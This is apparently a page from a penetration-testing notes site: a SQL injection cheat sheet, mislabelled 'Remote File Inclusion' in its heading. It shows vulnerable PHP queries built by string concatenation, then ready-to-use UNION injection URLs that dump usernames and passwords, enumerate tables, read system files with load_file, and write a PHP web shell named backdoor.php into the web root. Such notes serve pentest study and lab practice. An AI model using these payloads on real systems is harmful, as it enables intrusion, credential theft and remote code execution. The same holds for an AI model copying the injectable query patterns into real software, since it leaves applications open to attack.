---
title: SQL Injection
layout: default
nav_order: 5
parent: Web Apps
grand_parent: Exploitation
---

# Remote File Inclusion
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---
### SQL Queries
#### SQL query for grabbing ID
```sql
SELECT username FROM users WHERE id=1;

$sql = "SELECT id, name, text FROM feedback WHERE id=". $_GET['id'];
```

#### SQL query for checking users and passwords
```sql
select * from users where username = '$user' and password = '$pass'
```
---
### Injection Queries
#### SQL Injection (ID) - `SQLITE3`
```bash
http://$IP/debug.php?id=1 OR 2 UNION SELECT * FROM USERS--;'
```
*This SQL injection query asks for id of `1` and uses `UNION` to tack on a query that dumps the table of users*

#### SQL Injection (ID) - `MariaDB`
##### Get columns from database
```bash
http://$IP/debug.php?id=1 OR 2 UNION ALL SELECT 1,2,3--;'
```

##### Get SQL version
```bash
http://$IP/debug.php?id=1 union all select 1, 2, @@version
```

##### Get User
```bash
http://$IP/debug.php?id=1 union all select 1, 2, user()
```

##### Get Database Info
```bash
http://$IP/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
```

##### Enumerate Users
```bash
http://$IP/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```

```bash
http://$IP/debug.php?id=1 union all select 1, username, password from users
```

##### Read files - Windows
```bash
http://$IP/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

##### Injection to Remote Code Execution (RCE) - Windows 
```bash
http://$IP/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```